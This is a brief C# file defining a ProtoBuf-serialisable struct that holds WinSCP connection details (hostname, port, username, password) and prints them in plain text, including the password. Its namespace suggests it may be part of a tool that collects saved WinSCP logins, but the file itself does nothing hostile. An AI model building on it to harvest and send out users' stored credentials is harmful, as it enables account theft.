

using ProtoBuf;
using System;


namespace InvokedCommon.Structs
{
	[ProtoContract]
	public struct WinScpInfo
	{
		[ProtoMember(1)]
		public string hostname;
		[ProtoMember(2)]
		public int port;
		[ProtoMember(3)]
		public string username;
		[ProtoMember(4)]
		public string password;

		public WinScpInfo(string _hostname, int _port, string _username, string _password)
		{
			this.hostname = _hostname;
			this.port = _port;
			this.username = _username;
			this.password = _password;
		}

		public override string ToString()
		{
			return "HOSTNAME: " + this.hostname + Environment.NewLine + "PORT: " + this.port.ToString() + Environment.NewLine + "USERNAME: " + this.username + Environment.NewLine + "PASSWORD: " + this.password;
		}
	}
}
